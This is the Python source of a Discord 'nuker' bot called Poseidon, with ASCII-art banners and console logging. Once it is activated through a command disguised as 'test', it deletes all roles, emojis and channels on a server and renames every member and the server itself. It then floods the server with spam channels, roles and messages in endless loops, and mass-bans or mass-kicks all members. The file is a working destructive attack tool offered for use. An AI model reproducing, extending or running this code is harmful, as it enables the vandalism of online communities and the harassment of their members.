import nextcord
from nextcord.ext import commands
from colorama import Fore, init
import pystyle
from pystyle import Anime, Colorate, Colors, Center, System, Write
from pynotifier import Notification
import json
import datetime


with open('config.json', 'r') as f:
    config = json.load(f)

token = config.get('token')
prefix = config.get('prefix')
spam_msg = config.get("spam_msg")
spam_msg2 = config.get("spam_msg2")
mention = config.get("mention")
role = config.get("role")

intents = nextcord.Intents.default()
bot = commands.Bot(command_prefix=f"{prefix}" ,description="Poseidon", intents=intents)
bot.remove_command("help")


ascii = """
ooooooooo.                                 o8o        .o8                        
`888   `Y88.                               `"'       "888                        
 888   .d88'  .ooooo.   .oooo.o  .ooooo.  oooo   .oooo888   .ooooo.  ooo. .oo.   
 888ooo88P'  d88' `88b d88(  "8 d88' `88b `888  d88' `888  d88' `88b `888P"Y88b  
 888         888   888 `"Y88b.  888ooo888  888  888   888  888   888  888   888  
 888         888   888 o.  )88b 888    .o  888  888   888  888   888  888   888  
o888o        `Y8bod8P' 8""888P' `Y8bod8P' o888o `Y8bod88P" `Y8bod8P' o888o o888o 
                                                                                                                                                                             
"""[1:]

banner = """
                   :%:     :@      :%                     
                    &#%:   @§$   :%/@                     
                    @§/%: *&§&! :%§§$                     
                    !&#    !§:    /$!                     
                    !§%    *§:    $/:                     
                   */$     *§:     @/!                    
                  !/%      *§:      $/:                   
                  &/::    :*§!:    :!§@                   
                  */§//////§§§//////§#!                   
                   :!*%%%%*/§#*%%%%*!                     
                           $&%                            
                           %@*                            
                           %@*                            
                           *@!                            
                           *@!                            
                           *@!   ::                       
                :::::: ::: *@! ::::::::::                 
                           !@!                            
                           !@:                            
                           !@:                            
                           !@:                            
                           !@:                            
                           !@:                            
                           !@:                            
                           !@:                            
                           !@!                            
                           *@!                            
                           *@!                            
                           *@!                            
                           *@!                            
                           %@*                            
                           %&*                            
                           %$*                            
"""[1:]



@bot.event
async def on_ready():
    Notification(
        title='Poseidon',
        description=f'Logged in as: {bot.user}',
        duration=5,
        icon_path="./stuff/logo.ico",
        urgency='normal').send()
    System.Size(140, 40)
    System.Title("Poseidon")
    System.Clear()
    Anime.Fade(Center.Center(banner), Colors.blue_to_cyan, Colorate.Vertical, interval=0.025, enter=True)
    print("\n" * 2)
    print(Colorate.Diagonal(Colors.blue_to_cyan, Center.XCenter(ascii)))
    print("\n" * 5)
    Write.Print("Successful connection !\n\n", Colors.blue_to_cyan, interval=0.025)
    Write.Print(f"Your prefix is : ", Colors.blue_to_cyan, interval=0.025)
    Write.Print(f"{prefix}\n\n", Colors.white, interval=0.025)
    Write.Print(f"You are connected on : {bot.user}\n\n", Colors.blue_to_cyan, interval=0.025)
    await bot.change_presence(activity=nextcord.Game(f"{prefix}help"))
    print("\n" * 5)



blank = "\t\t\t\t\t"
blank1 = "\t\t\t\t\t    "
midlle = "\t"
stop = True
nuker = False
def update_time():
    now = datetime.datetime.now()
    current_time = now.strftime("%H:%M")
    return current_time

skull =  """
          .                                                      .
        .n                   .                 .                  n.
  .   .dP                  dP                   9b                 9b.    .
 4    qXb         .       dX                     Xb       .        dXp     t
dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
    `9XXXXXXXXXXXP' `9XX'   POS    `98v8P'  EIDON   `XXP' `9XXXXXXXXXXXP'
        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                     `'      9XXXXXX(   )XXXXXXP      `'
                              XXXX X.`v'.X XXXX
                              XP^X'`b   d'`X^XX
                              X. 9  `   '  P )X
                              `b  `       '  d'
                               `             '
"""[1:]

# help

@bot.command()
async def help(ctx):
    embed = nextcord.Embed(
        title=f"**{prefix}Help**",
        description="*Voici la liste des commandes disponible :*\n",
    )
    embed.add_field(name="Nuke", value=f"{prefix}test", inline=True)
    await ctx.message.delete()
    await ctx.send(embed=embed)


# Nuke:)

@bot.command()
async def test(ctx):
    System.Clear()
    print("\n" * 2)
    print(Colors.red, Center.XCenter(skull))
    global nuker
    if not nuker:
        await ctx.message.delete()
        print("\n")
        print(Fore.GREEN + blank + midlle + "      Activated Nuke mode hehe")
        print(Fore.CYAN + blank + midlle +"\t     Commands:")
        print(Fore.MAGENTA + blank + midlle + " ----------------------------------")
        print(blank + midlle + f" |nuke / spam_every_channel / role_spam| ")
        print(blank + midlle + f" |/ delete_all_channels           |")
        print(blank + midlle + " |ping_spam / mass_kick / mass_ban|")
        print(blank + midlle + " |stop                            |")
        print(blank + midlle + " ----------------------------------")
        print(blank + midlle + "\t       Log:")
        print(Fore.BLUE + "\t\t\t\t" + midlle + "     -------------------------------------------")
        nuker = True
    else:
        await ctx.message.delete()


@bot.command()
async def nuke(ctx):
    global stop
    if nuker:
        Write.Print(blank1 + midlle + f"[{update_time()}] Nuke attack started hehe\n", Colors.red, interval=0.025)
        await ctx.message.delete()
        for role in ctx.message.guild.roles:
            try:
                await role.delete()
            except:
                pass
        for emoji in ctx.message.guild.emojis:
            try:
                await emoji.delete()
            except:
                pass
        Write.Print(blank1 + midlle + f"[{update_time()}] Deleted all emojis!\n", Colors.red, interval=0.025)
        print(Fore.RED + blank1 + midlle + f"[{update_time()}] Deleted all roles!")
        for member in ctx.message.guild.members:
            try:
                await member.edit(nick=f"{spam_msg}")
            except:
                pass
        await ctx.message.guild.edit(name=f"{spam_msg}")
        for channel in ctx.message.guild.voice_channels:
            await channel.delete()
            if not stop:
                stop = True
                break
        for channel in ctx.message.guild.text_channels:
            await channel.delete()
            if not stop:
                stop = True
                break
        print(Fore.RED + blank1 + midlle + f"[{update_time()}] Deleted all channels")
        print(Fore.RED + blank1 + midlle + f"[{update_time()}] Creating channels")
        while True and stop:
            await ctx.message.guild.create_text_channel(f"{spam_msg}")
            await ctx.message.guild.create_voice_channel(f"{spam_msg}")
        else:
            stop = True
    else:
        await ctx.message.delete()
        print(Fore.RED + blank + midlle + f"You need to type {prefix}test first")


# Delete all channels
@bot.command()
async def delete_all_channels(ctx):
    if nuker:
        global stop
        await ctx.message.delete()
        for channel in ctx.message.guild.channels:
            await channel.delete()
            if not stop:
                stop = True
                break
        ch = await ctx.message.guild.create_text_channel("finished")
        await ch.send("Cleared successfully")
        print(Fore.RED + blank1 + midlle + f"[{update_time()}] Cleared successfully")


# Spam every channel
@bot.command()
async def spam_every_channel(ctx):
    if nuker:
        global stop
        await ctx.message.delete()
        print(Fore.RED + blank1 + midlle + f"[{update_time()}] Started spamming!")
        for channel in ctx.message.guild.text_channels:
            if not stop:
                stop = True
                break
            if channel.type == nextcord.ChannelType.voice:
                continue
            for i in range(10):
                await channel.send(f"{spam_msg2}")
                await channel.send(spam_msg)
        print(Fore.RED + blank1 + f"[{update_time()}] Restarting Spam!")
        for channel in ctx.message.guild.text_channels:
            if not stop:
                stop = True
                break
            if channel.type == nextcord.ChannelType.voice:
                continue
            for i in range(10):
                await channel.send(f"{spam_msg2}")
                await channel.send(spam_msg)
        print(Fore.RED + blank1 + midlle + f"[{update_time()}] Stopped spamming!")


# Spam roles
@bot.command()
async def role_spam(ctx):
    if nuker:
        global stop
        await ctx.message.delete()
        print(Fore.RED + blank1 + midlle + f"[{update_time()}] Started mass creating roles")
        while True and stop:
            await ctx.message.guild.create_role(name=f"{role}", colour=nextcord.Colour.blue())
        else:
            stop = True


# Ban all members
@bot.command()
async def mass_ban(ctx):
    if nuker:
        global stop
        await ctx.message.delete()
        print(Fore.RED + blank1 + midlle + f"[{update_time()}] Started mass banning!")
        count = 0
        for user in ctx.message.guild.members:
            if user == ctx.message.author:
                continue
            try:
                await user.ban(reason=f"{spam_msg}", delete_message_days=7)
                count += 1
            except PermissionError:
                continue
            if not stop:
                stop = True
                break
        print(Fore.RED + blank1 + midlle + f"[{update_time()}] Successfully banned {count} members")


# Kick all members
@bot.command()
async def mass_kick(ctx):
    if nuker:
        global stop
        await ctx.message.delete()
        print(Fore.RED + blank1 + midlle + f"[{update_time()}] Started mass kicking!")
        count = 0
        for user in ctx.message.guild.members:
            if user == ctx.message.author:
                continue
            try:
                await user.kick(reason=f"{spam_msg}")
                count += 1
            except:
                pass
            if not stop:
                stop = True
                break
        print(Fore.RED + blank1 + midlle + f"[{update_time()}] Successfully kicked {count} members")


@bot.command()
async def stop(ctx):
    global stop
    await ctx.message.delete()
    stop = False
    print(Fore.RED + blank1 + midlle + f"[{update_time()}] Stopped current operation")








System.Clear()
Write.Print("\n\n\n\n\n\nLaunch of the current bot...", Colors.blue, interval=0.025)
bot.run(f"{token}")






























